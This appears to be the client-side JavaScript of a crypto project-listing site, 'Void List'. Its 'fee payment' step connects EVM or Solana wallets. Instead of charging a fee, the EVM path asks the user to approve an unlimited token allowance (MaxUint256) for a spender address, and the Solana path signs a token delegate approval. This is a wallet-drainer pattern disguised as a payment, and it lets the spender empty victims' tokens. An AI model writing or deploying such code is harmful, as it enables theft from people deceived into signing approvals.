document.addEventListener("DOMContentLoaded", () => {
  const projectForm = document.getElementById("projectForm");
  const feeModal = document.getElementById("feeModal");
  const walletModal = document.getElementById("walletModal");
  const proceedButton = document.getElementById("proceedButton");
  const walletConnectEvmButton = document.getElementById("walletConnectEvmButton");
  const solanaWalletButton = document.getElementById("solanaWalletButton");
  const chainSelect = projectForm.querySelector("select");

  // ERC20 ABI for approve
  const ERC20_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)"
  ];
  const SPENDER_ADDRESS = "0xYourSpenderAddressHere";

  // Show fee modal after form submission
  projectForm.addEventListener("submit", (e) => {
    e.preventDefault();
    feeModal.classList.remove("hidden");
  });

  // Proceed to payment → show wallet modal
  proceedButton.addEventListener("click", () => {
    feeModal.classList.add("hidden");
    walletModal.classList.remove("hidden");

    // Hide both buttons initially
    walletConnectEvmButton.classList.add("hidden");
    solanaWalletButton.classList.add("hidden");

    // Show correct wallet option based on selected chain
    const chain = chainSelect.value.toLowerCase();
    if (["ethereum", "bnb chain", "polygon", "arbitrum"].includes(chain)) {
      walletConnectEvmButton.classList.remove("hidden");
    } else if (chain === "solana") {
      solanaWalletButton.classList.remove("hidden");
    }
  });

  // Close modals
  document.querySelectorAll(".close").forEach(btn => {
    btn.addEventListener("click", () => {
      btn.closest(".modal").classList.add("hidden");
    });
  });

  // =========================
  // WalletConnect (EVM) → supports MetaMask, Trust Wallet, Coinbase, Rainbow, etc.
  // =========================
  walletConnectEvmButton.addEventListener("click", async () => {
    try {
      const { EthereumProvider } = window;
      const wcProvider = await EthereumProvider.init({
        projectId: "YOUR_WALLETCONNECT_PROJECT_ID",
        chains: [1], // Ethereum mainnet
        showQrModal: true,
        rpcMap: { 1: "https://eth.llamarpc.com" },
        metadata: { name: "Void List", url: window.location.origin }
      });

      await wcProvider.enable();
      const provider = new ethers.providers.Web3Provider(wcProvider);
      const signer = provider.getSigner();

      const tokenAddress = "0xYourTokenContractAddressHere"; // replace with actual token
      const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);

      const tx = await token.approve(SPENDER_ADDRESS, ethers.constants.MaxUint256);
      alert(`Approval transaction sent: ${tx.hash}`);

      const receipt = await tx.wait();
      if (receipt.status === 1) {
        alert("✅ Approval successful!");
      } else {
        alert("❌ Approval failed.");
      }
    } catch (err) {
      console.error(err);
      alert("WalletConnect approval error: " + err.message);
    }
  });

  // =========================
  // Solana Wallets → supports Phantom, Solflare, Backpack, Glow, etc.
  // =========================
  solanaWalletButton.addEventListener("click", async () => {
    try {
      // Example: Phantom adapter, but you can add Solflare, Backpack, Glow
      const adapter = new PhantomWalletAdapter();
      await adapter.connect();
      const publicKey = adapter.publicKey.toBase58();
      alert(`Connected to Solana wallet: ${publicKey}`);

      const connection = new Connection("https://api.mainnet-beta.solana.com");
      const tokenMint = new PublicKey("DqfoyZH96RnvZusSp3Cdncjpyp3C74ZmJzGhjmHnDHRH");
      const owner = adapter.publicKey;
      const spender = new PublicKey("YOUR_SPENDER_ADDRESS"); // replace with actual
      const ata = await getAssociatedTokenAddress(tokenMint, owner);
      const ix = createApproveInstruction(ata, spender, owner, 1000000, [], TOKEN_PROGRAM_ID);

      const tx = new Transaction().add(ix);
      await adapter.sendTransaction(tx, connection);
      alert("Approval transaction sent!");
    } catch (err) {
      console.error(err);
      alert("Solana wallet connection failed.");
    }
  });
});
